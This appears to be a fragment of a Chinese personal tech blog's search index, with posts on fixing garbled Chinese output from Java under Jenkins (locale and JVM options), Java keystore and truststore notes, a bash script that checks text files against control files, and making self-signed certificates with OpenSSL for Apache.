不知你是否會有疑問，這麼多的配置文件，究竟每個文件裡面應該包含哪些配置，比如PATH應該在哪？提示符應該在哪配置？啟動的程序應該在哪？等等。所以在文章的最後，我蒐羅了一些最佳實踐供各位參考。（這裡只討論屬於用戶個人的配置文件） \u003e \u003e ~/.bash_profile：應該儘可能的簡單，通常會在最後加載.profile和.bashrc(注意順序) \u003e ~/.bash_login：在前面討論過，別用它 \u003e ~/.profile：此文件用於login shell，所有你想在整個用戶會話期間都有效的內容都應該放置於此，比如啟動進程，環境變量等 \u003e ~/.bashrc：只放置與bash有關的命令，所有與交互有關的命令都應該出現在此，比如bash的補全、alias、顏色、提示符等等。特別注意：別在這裡輸出任何內容（我們前面只是為了演示，別學我哈） 因為我猜測 jenkins 進去跟我用 xshell 語系不一樣 所以就做了 log 紀錄，發現真的不一樣 ```bash export LC_ALL=\"en_US.UTF-8\" date \u003e\u003e /tmp/test_ssh.log env \u003e\u003e /tmp/test_ssh.log echo \"--------\" \u003e\u003e /tmp/test_ssh.log locale \u003e\u003e /tmp/test_ssh.log echo \"=======\" \u003e\u003e /tmp/test_ssh.log 但不是上面問題 之前看到使用 file.enconding 去解決 但實際用上卻沒有效果 跟 file.enconding 沒關係，是我使用 JAVA_OPTS環境變數 沒有效果，後面會講到 java 預設在處理文字檔案的寫入時， 會以 os 的預設編碼當作寫入的編碼規則， 這個問題常會發生在 windows 英文的作業系統要寫入中文的時候發生， 解法1： 如果是用 java 執行的 jar ， java -Dfile.encoding=UTF8 -jar e:\\bin\\ExportToFile.jar 解法2： 加入環境變數 JAVA_OPTS， windows 環境： JAVA_OPTS=-Dfile.encoding=UTF8;%JAVA_OPTS% linux 環境： $\u003e export JAVA_OPTS=-Dfile.encoding=UTF8:$JAVA_OPTS 解法3： 在程式裡面設定： 取得目前系統檔案編碼屬性 String defaultEncodingName = System.getProperty( “file.encoding” ); 設定系統檔案編碼屬性 System.setProperty(“file.encoding”, “UTF-8”); 解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"了解一下 LC_* 環境變數 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:0","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"wiki 在Ubuntu作業系統中，使用man locale-gen或man locale可獲得關於locale實現的細節。實際上是由glibc庫實現的。 locale相關（環境）變數生效的優先順序：[1] LANGUAGE 指定個人對語言環境值的主次偏好，例如zh_CN:en_US:en LC_ALL 這不是一個環境變數，是一個可被C語言庫函式setlocale設定的宏，其值可覆蓋所有其他的locale設定。因此\u003e 預設時此值為空 LC_xxx 可設定locale各方面（category）的值，可以覆蓋LANG的值。 LANG 指定預設使用的locale值 可以把上述環境變數設在/etc/profile 或 /etc/environment等系統初始檔案中。值得注意的是，若LANG或LC_ALL被設\u003e 定為 “C”，那麼LANGUAGE的值將被忽視。 [2] 除 C 和 POSIX這兩個locale名稱外，locale的名稱並未標準化。Linux平台與Windows系統的locale名稱有很大不同。\u003e Linux名稱的命名規則為： language[_territory[.codeset]][@modifier] 其中language是ISO 639-1標準中定義的雙字母的語言代碼 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:1","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"暫時語系用法 感覺是暫時環境變數，但沒有詳細看到有人這樣介紹 $ LC_TIME=en_US.UTF-8 date Fri Oct 31 19:51:16 CST 2014 $ LC_TIME=fi_FI.UTF-8 date pe 31.10.2014 19.52.00 +0800 $ LC_TIME=zh_CN.UTF-8 date 2014年 10月 31日 星期五 19:53:07 CST PS: 上面使用 locale -a 有安裝成功的才能用 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:2","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"POSIX 和 C 更改 Linux 系統語言環境變量 - Jamin Zhang LC_ALL=C 是為了去除所有本地化的設置，讓命令能正確執行。 C 是系統默認的 locale，」POSIX」是」C」的別名。所以當我們新安裝完一個系統時，默認的 locale 就是 C 或 POSIX。 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:3","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"to default locale: No such file or directory Locale - Ubuntu 18.04 探索筆記 會多出現三行 ssh remote bash 登入使用 locale 指令會出現 locale: Cannot set LC_CTYPE to default locale: No such file or directory locale: Cannot set LC_MESSAGES to default locale: No such file or directory locale: Cannot set LC_ALL to default locale: No such file or directory 只要執行下面的指令，就可以解決 $ sudo locale-gen zh_TW.UTF-8 但我沒使用這個方案解決 至於原因可能是 Linux Xshell登录报错 locale: Cannot set LC_CTYPE to default locale: No such file or directory（已解决）_醉世老翁的博客-CSDN博客_locale -a locale: cannot set lc_ctype to default l CentOS6.5手动安装glibc-2.14后locale出现No such file or directory终极解决办法_guitar___的博客-CSDN博客_centos character map file `utf-8 not found: no su ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:4","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"查看 Java file encoding Java May Use UTF-8 as its Default Charset - DZone Java CharsetDemo.java public class CharsetDemo { /** * Supplies the default encoding without using Charset.defaultCharset() * and without accessing System.getProperty(\"file.encoding\"). * * @return Default encoding (default charset). */ public static String getEncoding() { final byte [] bytes = {'D'}; final InputStream inputStream = new ByteArrayInputStream(bytes); final InputStreamReader reader = new InputStreamReader(inputStream); final String encoding = reader.getEncoding(); return encoding; } public static void main(final String[] arguments) { out.println(\"Default Locale: \" + Locale.getDefault()); out.println(\"Default Charset: \" + Charset.defaultCharset()); out.println(\"file.encoding: \" + System.getProperty(\"file.encoding\")); out.println(\"sun.jnu.encoding: \" + System.getProperty(\"sun.jnu.encoding\")); out.println(\"Default Encoding: \" + getEncoding()); } } 環境變量JAVA_TOOL_OPTIONS、_JAVA_OPTIONS、JAVA_OPTS設置_ly199108171231的博客-CSDN博客_java_options 備份圖 這邊查到 JAVA_OPTS 是 Tomcat 用的 難怪我試個老半天都沒有什麼效果 JAVA_TOOL_OPTIONS 確實就正常了 JAVA_OPTS：常用於一些應用的配置，如Tomcat，但它一般不作為環境變量，也不能被JVM識別的，是那些應用的自定義配置； _JAVA_OPTIONS：也是作為環境變量來替代命令行參數的，但它是JVM廠家自定義的，可以覆蓋JAVA_TOOL_OPTIONS，但各廠家的不同，_JAVA_OPTIONS是Oracle的JVM，而IBM的則是用IBM_JAVA_OPTIONS。 JAVA_TOOL_OPTIONS：是標準的，所有虛擬機都能識別和應用的。 如果想驗證上面的不同也不難，如果設置了JVM能識別的環境變量，JVM會有\"Picked up\"的提示的，如： export JAVA_OPTS=zhaiqiafneng export JAVA_TOOL_OPTIONS=\"-Xmx512m -Xms64m\" java -version JVM會打印： Picked up JAVA_TOOL_OPTIONS: -Xmx512m -Xms64m java version \"1.8.0_101\" Java(TM) SE Runtime Environment (build 1.8.0_101-b13) Java HotSpot(TM) 64-Bit Server VM (build 25.101-b13, mixed mode) # Big5 LC_ALL=zh_TW.BIG5 java Xxxx # Big5 java -Dfile.encoding=big5 Xxxx # Big5 LC_ALL=zh_TW.UTF8 java -Dfile.encoding=big5 Xxxx 排程踩雷注意 linux 中crontab 定时 shell脚本启动jar包，tomcat失败_醉世老翁的博客-CSDN博客_linux 定时任务启动的tomcat jar包不一样 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:0","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Java properties and XML and log4j 固定都吃 ISO-8859-1 .properties檔案的編碼是ISO-8859-1，又稱為Latin-1。所有非Latin-1字元必須利用Unicode跳脫字元錄入，例如\\uHHHH中，HHHH是某個字元的Unicode字元集的十六進位的索引。這樣就可以使用.properties檔案作為在地化的屬性資源包。非Latin-1的文字檔案，可以通過使用隨JDK提供的native2ascii工具轉換為正確的.properties檔案；或使用如po2prop[1]的第三方工具，管理雙語在地化格式跳脫為.properties 難怪… .properties 無法正常看到 UTF-8 .properties - 維基百科，自由的百科全書 XML 是吃 UTF-8 原本想獨立寫一篇測試 但內容不太多，所以就整理在這邊 log4j 也能設定指定 encoding，不過…這邊跟 Java 一樣，預設是帶 System 帶入的 log4j日誌記錄到文件 - Log4j教學 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:1","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"相關網站整理 裡面也混雜一些彩蛋 區域化環境類別 (categories) 地區標籤 java.util.Locale.getDefault()方法實例 - Java.util包 locale的设定及LANG、LC_CTYPE、LC_ALL环境变量 - Lo0ong - 博客园 解決 macOS SSH 連線中文亂碼的問題 - Kaix Blog jvm 性能调优工具之 jinfo - 简书 locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码 詳解Linux中文亂碼問題終極解決方法 | 程式前沿 locale的设定及LANG、LC_CTYPE、LC_ALL环境变量_laven90的专栏-CSDN博客_如何设置 locale 解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌 Linux下配置Jenkins+gitlab持續整合構建流程 | IT人 Jenkins使用/etc/profile中环境变量异常_jiangshanwe-CSDN博客_jenkins /etc/profile Jenkins / Hudson environment variables - Stack Overflow Linux 用 ps 與 top 指令找出最耗費 CPU 與記憶體資源的程式 - G. T. Wang 詳解Linux中文亂碼問題終極解決方法 | 程式前沿 更改 Linux 系统语言环境变量 - Jamin Zhang locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码 bash 四种工作模式及其相关的配置文件 Linux系统bash的四种模式与jenkins执行shell的环境变量问题_Robin Hu的专栏-CSDN博客_jenkins shell环境变量 ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量 SDKMAN is able to install on Java on ARM · Issue #640 · sdkman/sdkman-cli ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:3:0","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"其他連結(很多重複) FileWriter (Java SE 12 ) Java丨Cmd運行Jar出現亂碼問題 - 台部落 Linux中java log输出中文乱码 中文变“?”_一起进步的博客-CSDN博客_linux log日志中文乱码 linux中使用tail -f查看日志出现中文乱码的解决方案_付之一笑的专栏-CSDN博客_linux 日志乱码 log4j日志文件乱码解决方法_log4j中文乱码,log4j中文乱码-Java文档类资源-CSDN下载 Linux下中文变问号的解决办法_sui102的专栏-CSDN博客_liunx windows 中文字符变问号 log4j乱码问题解决办法_linux上配置log4j,linux配置log4j-Java文档类资源-CSDN下载 Java 程式處理網址 URL 百分比編碼與解碼教學 - G. T. Wang Java讀帶有BOM的UTF-8檔案亂碼 - IT閱讀 Java -Dfile.encoding=UTF-8的使用_haixia_12的专栏-CSDN博客_-dfile.encoding=utf-8 log4j 控制台和文件输出乱码问题解决 [轉]log4j日誌檔案亂碼問題的解決方法 - IT閱讀 utf 8 - Setting the default Java character encoding - Stack Overflow file - JVM property -Dfile.encoding=UTF8 or UTF-8? - Stack Overflow 理解環境變數 JAVA_TOOL_OPTIONS | 程式前沿 牙根 會痛 假牙 - Google 搜尋 shell ssh command - Google 搜尋 A few ways to execute commands remotely using SSH · zaiste.net ssh 遠端 執行程式 log 亂碼 lang - Google 搜尋 SSH訪問linux 亂碼問題 - IT閱讀 清水國中資訊組 | locale語系設定UTF-8與Big5 解決遠端 SSH 連線主機時文字編碼設定 locale 錯亂問題 | 一介資男 [ssh] — 如何從〜/ .ssh / config禁用ssh_config中設置的SendEnv變量 關閉 SSH SendENV 解決 locale 問題 | Somewhere I Belong 增進 SSH 使用效率 - ssh_config · 完全用 GNU/Linux 工作 SendEnv jenkins ssh 亂碼 - Google 搜尋 jenkins 节点主机在不同系统导致乱码的解决办法 - 花花兽的个人页面 - OSCHINA Jenkins on Windows 心得分享 (03)：有效避免記錄檔或訊息出現亂碼的方法 | The Will Will Web Jenkins之解决乱码问题_ZZY1078689276的专栏-CSDN博客_jenkins utf-8 文件乱码 【转】ssh 中文乱码问题_安科网 ","date":"2020-07-30","objectID":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:3:1","tags":["linux","java"],"title":"Jenkins 執行 Java 程式亂碼解決方法","uri":"/blog/posts/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近研究憑證，知道 Java 管理憑證機制是用自己的 keystore 這個是 Java 用的憑證 本篇不實作，簡單整理網路上的資訊 ","date":"2020-07-28","objectID":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/:0:0","tags":["java"],"title":"keystore 小記","uri":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"什麼是 keystore Keytool是Java證書的管理工具，Keytool將金鑰（key）、證書（certificates）存在一個keystore的檔案裡 利用keystore 指令來確認憑證密碼 - 可丁丹尼 @ 一路往前走2.0 ","date":"2020-07-28","objectID":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/:1:0","tags":["java"],"title":"keystore 小記","uri":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"jssecacerts JSSE簡介 Java安全套接擴展 (Java Secure Socket Extension, JSSE)是實現Internet安全通信的一系列包的集合。它是一個\u003eSSL和TLS的純Java實現，可以透明地提供數據加密、服務器認證、信息完整性等功能，可以使我們像使用普通的套接字一樣使\u003e用JSSE建立的安全套接字。JSSE是一個開放的標準，不只是Sun公司才能實現一個JSSE，事實上其他公司有自己實現的JSSE。 在深入瞭解JSSE之前，需要瞭解一個有關Java安全的概念：客戶端TrustStore文件。客戶端的TrustStore文件中保存著被客戶端所信任的服務器證書信息，客戶端在嘗試進行SSL連接時，JSSE將根據這個文件中的證書是否決定信任服務端的證書。 JSSE中有一個信任管理器負責決定是否信任遠程服務器的證書，該類有如下處理原則： 如果該系統屬性javax.net.sll.trustStore指定了TrustStore文件，那麼信任管理器就去jre安裝路徑下的lib/security/目錄中尋找並使用這個文件來檢查證書。如果該系統沒有指定TrustStore文件，它就會去jre安裝路徑下尋找默認的TrustStore文件，這個文件的相對路徑為：lib/security/jssecacerts。如果jssecacerts不存在，但是cacerts存在(它隨J2SDK一起發行，含有數量有限的可信任的基本證書)，那麼這個默認的TrustStore文件就是cacerts。Java提供了一種非常簡潔的方法來訪問HTTPS網頁，即使用類HttpsURLConnection、URL等。這些類為支持HTTPS對JSSE相關類做了一些封裝。 用Java實現HTTPS工作原理（二） - 知乎 最近專案看到 jssecacerts 從這個上面我猜測是管理根憑證東西 Java 預設是沒有加入根憑證的，所以沒辦法使用。 要怎麼測試憑證 Java 吃的到? Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記 這篇有講到檢查憑證方法 可以指定根憑證檢查檔案 java -Djavax.net.ssl.trustStore=/path.../jssecacerts -jar java-keystore-test-0.1.0.jar https://xxx.twca.domain 檢查也有找到這個方法可用[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落 SSLPoke.java import java.io.PrintStream; import javax.net.ssl.SSLHandshakeException; import javax.net.ssl.SSLSocket; import javax.net.ssl.SSLSocketFactory; public class SSLPoke { public SSLPoke() {} public static void main(String[] paramArrayOfString) { if (paramArrayOfString.length != 2) { System.err.println(\"Utility to debug Java connections to SSL servers\"); System.err.println(\"Usage: \"); System.err.println(\" java \" + SSLPoke.class.getName() + \" \u003chost\u003e \u003cport\u003e\"); System.err.println(\"or for more debugging:\"); System.err.println(\" java -Djavax.net.debug=ssl \" + SSLPoke.class.getName() + \" \u003chost\u003e \u003cport\u003e\"); System.err.println(); System.err.println(\"Eg. to test the SSL certificate at https://localhost, use\"); System.err.println(\" java \" + SSLPoke.class.getName() + \" localhost 443\"); System.exit(1); } try { SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault(); SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[0], Integer.parseInt(paramArrayOfString[1])); java.io.InputStream localInputStream = localSSLSocket.getInputStream(); java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream(); localOutputStream.write(1); while (localInputStream.available() \u003e 0) { System.out.print(localInputStream.read()); } System.out.println(\"Successfully connected\"); System.exit(0); } catch (SSLHandshakeException localSSLHandshakeException) { if (localSSLHandshakeException.getCause() != null) { localSSLHandshakeException.getCause().printStackTrace(); } else { localSSLHandshakeException.printStackTrace(); } } catch (Exception localException) { localException.printStackTrace(); } System.exit(1); } } ## 先打包成class $ javac SSLPoke.java $ java SSLPoke www.google.com 443 連線成功會顯示 $ java SSLPoke www.google.com 443 Successfully connected 失敗就會出現一大堆錯 看根憑證 # 查詢keystore的內容 keytool –list –v –keystore .keystore Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落 加入 TWCA 根憑證 keytool -importcert -file \"twca root ca.cer\" -keystore jssecacerts jssecacerts 是放憑證 Java 存放憑證路徑 C:\\Program Files\\Java\\jdk-13.0.2\\lib\\security Linux 待補(有想到的話)，其實也是放在相似地方 本篇到這邊 查詢整理 Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落 我的工作日記: Java Keytool的使用及申請憑證(以Microsoft Active Directory Certificate Services為例) Java Keytool使用方式 - SSL憑證推薦網 | SSL憑證 | code Sign 使用自签名证书，简单步骤 - 凝雨 - Yun 利用keytool 匯入CA Root 憑證方式 - 寰宇數位認證中心 - 技術支援 Support ssl - java - path to trustStore - set property doesn’t work? - Stack Overflow [JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落 Use SSL Poke to test Java SSL connection - matthewdavis111 Connecting to SSL services - Atlassian Documentation Android Studio：Keystore 建立與管理. 撰文時使用 MAC + Android Studio 2.2RC | by Kent Chen | Medium 关于keystore的简单介绍_人在旅途-CSDN博客_keystore是什么 Android Keystore漫谈 - 简书 crt to keystore - Google 搜尋 CRT证书转JKS证书 - 簡書 Keystore更新重置. 相信可能有人有遺失Keystroe的經驗，因這次筆者拿金鑰去註冊測試Fireba… | by 陳建維 Ben | 工程師求生指南(Sofware Engineer Survival Guide) | Medium DH技術筆記: SSL憑證","date":"2020-07-28","objectID":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/:2:0","tags":["java"],"title":"keystore 小記","uri":"/blog/posts/keystore-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近要人工分開 txt檔案 因為確認檔案花很多眼力去做調整 偶爾會有改錯情形 為了不發生這個原因 我做個簡單調整 #!/bin/bash FILE_LIST=(`ls *.txt *.ctl`) # echo ${#FILE_LIST[@]}; for i in ${!FILE_LIST[@]}; do FILE_LIST[$i]=\"${FILE_LIST[$i]%.*}\" done # echo \"${FILE_LIST[@]}\" | tr ' ' '\\n' | sort -u FILE_LIST=($(echo \"${FILE_LIST[@]}\" | tr ' ' '\\n' | sort -u )) # echo ${#FILE_LIST[@]}; for i in ${!FILE_LIST[@]}; do if [ -f ${FILE_LIST[$i]}.txt ]; then # 檔案 /path/to/dir/filename 存在 echo \"File ${FILE_LIST[$i]}.txt exists.\" else # 檔案 /path/to/dir/filename 不存在 echo \"File ${FILE_LIST[$i]}.txt does not exists.\" continue; fi if [ -f ${FILE_LIST[$i]}.ctl ]; then # 檔案 /path/to/dir/filename 存在 echo \"File ${FILE_LIST[$i]}.ctl exists.\" else # 檔案 /path/to/dir/filename 不存在 echo \"File ${FILE_LIST[$i]}.ctl does not exists.\" continue; fi FIRST_LINE=$(head -n 1 ${FILE_LIST[$i]}.ctl) LINE_COUNT=$(cat ${FILE_LIST[$i]}.txt | wc -l) #https://unix.stackexchange.com/questions/232384/argument-string-to-integer-in-bash/232386 echo \"TXT: $((LINE_COUNT+1))\" echo \"CTL: $FIRST_LINE\" ; if [ \"$FIRST_LINE\" = $((LINE_COUNT+1)) ]; then echo \"${FILE_LIST[$i]} 正確\" else echo \"${FILE_LIST[$i]} 不正確!!!!!!!!!!!!!!!!!!\" fi done #https://stackoverflow.com/questions/13648410/how-can-i-get-unique-values-from-an-array-in-bash # # line=$(head -n 1 filename) # https://stackoverflow.com/questions/3137094/how-to-count-lines-in-a-document # cat /dir/file.txt | wc -l ","date":"2020-07-19","objectID":"/blog/posts/Shell-%E6%AA%A2%E6%9F%A5-txt-%E5%92%8C-%E7%B8%BD%E6%95%B8%E7%A2%BA%E8%AA%8D%E6%AA%94%E6%96%B9%E6%B3%95/:0:0","tags":["shell"],"title":"Shell 檢查 txt 和 總數確認檔方法","uri":"/blog/posts/Shell-%E6%AA%A2%E6%9F%A5-txt-%E5%92%8C-%E7%B8%BD%E6%95%B8%E7%A2%BA%E8%AA%8D%E6%AA%94%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"上次上班花很多時間處理憑證問題 為了碰到下次不要花費太多時間設備根憑證不正確導致不能打API問題 | 程式狂想筆記 今天要還債(技術債)了 主要試試看建立憑證 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:0:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"建立根憑證 這邊範例是照如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web 可以找個 VM 來測試看環境 安裝 openssl ubuntu 預設就會安裝 設定 conf [req] prompt = no default_md = sha256 default_bits = 2048 distinguished_name = dn x509_extensions = v3_req [dn] C = TW ST = Taiwan L = Taipei O = Duotify Inc. OU = IT Department emailAddress = admin@example.com CN = localhost [v3_req] subjectAltName = @alt_names [alt_names] DNS.1 = *.localhost DNS.2 = localhost IP.1 = 192.168.2.100 產生私鑰、公鑰 openssl req -x509 -new -nodes -sha256 -utf8 -days 3650 -newkey rsa:2048 -keyout server.key -out server.crt -config ssl.conf 丟到系統憑證區 Ubuntu sudo cp server.crt /usr/local/share/ca-certificates/ sudo update-ca-certificates 測試結果 沒錯，就這麼簡單 可以找一個隨便 Web Server 建立 這邊我用的是 Apache 安裝 這邊小卡了一下，因為我是第一次設定XD 啟用 ssl 模組 a2enmod ssl 啟用 ssl 虛擬站台 a2ensite default-ssl 重啟 apache sudo service apache2 restart 修改憑證路徑(private.key,public.crt/pem) vim /etc/apache2/sites-enabled/default-ssl.conf SSLCertificateFile /home/vagrant/server.crt SSLCertificateKeyFile /home/vagrant/server.key 就可以測試結果了 curl https://localhost # ok echo \"\"|openssl s_client -connect localhost:443 2\u003e\u00261 | less # 會有Can't use SSL_get_servername # 不過還是過了，verify return:1 echo \"\"|openssl s_client -servername localhost -connect localhost:443 2\u003e\u00261 | less # 就不會有這個問題 Can't use SSL_get_servername 相關教學 OpenSSL 簽發憑證方式 [蔡宗融個人網站] 使用這個做，會有[Sat Jul 18 11:12:43.084807 2020] [ssl:emerg] [pid 27557:tid 140210043268160] SSL Library Error: error:140AB18E:SSL routines:SSL_CTX_use_certificate:ca md too weak AH00016: Configuration Failed 後來參考:Raspberry Pi 的實作 - 產生一張自己核發的 SSL 憑證 | IT 技術家 使用1024會有ee key too small nginx:SSL: error:140AB18F:SSL routines:SSL_CTX_use_certificate:ee key too small - 八戒vs - 博客园 改成 2048 就可以 原本我根憑證想簽下面憑證，產生出來設定在Apache 竟然都失敗了 這時候我突然想到，每一張都可以簽，不就沒有管理機制? 其他欄位比較重要的是basic constraints的CA:true和key usage的key cert sign，表示這個憑證可以再往下簽（總不可能讓它無限簽吧）。 參考來源:TU的雜七雜八筆記本: OpenSSL Certificate Chain (included SAN) HAProxy 整合 SSL/TLS Client Certificate 教學 - Soul \u0026 Shell Blog 這邊沒有提到CA:true 回頭看我產出來的 openssl x509 -noout -text -in server.crt 真的沒有CA:true 我 Google 到這篇如何使用 OpenSSL 簽發中介 CA 照他的產生 Root CA 步驟結果有看到 CA:true 估計是保哥使用x509_extensions = v3_req關係 所以沒有開到 CA:true ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:1:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"產生中繼憑證 ","date":"2020-07-18","objectID":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/:2:0","tags":["cert"],"title":"產生自簽憑證筆記","uri":"/blog/posts/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"產生授權根憑證 如何使用 OpenSSL 簽發中介 CA備份圖 建立 Key 應該是整個環節中最簡單的步驟了，利用簡單的 openssl genrsa 即可，這邊採用 AES256 加密 Key 並將長度設為 4096（如果你不想要加上密碼，就不要下 -aes256，但你的 Key 就少了一層保護）： 我不想打密碼就拿掉了 openssl genrsa -out ca.key 4096 相關資訊打完(備註: CN 我打 localhost) 複製到系統安全憑證區 sudo cp ca.pem /usr/local/share/ca-certificates/ca.srt # 這邊要改成srt sudo update-ca-certificates openssl x509 -noout -text -in ca.pem 確實有看到 CA: true 先到 Apache 測試 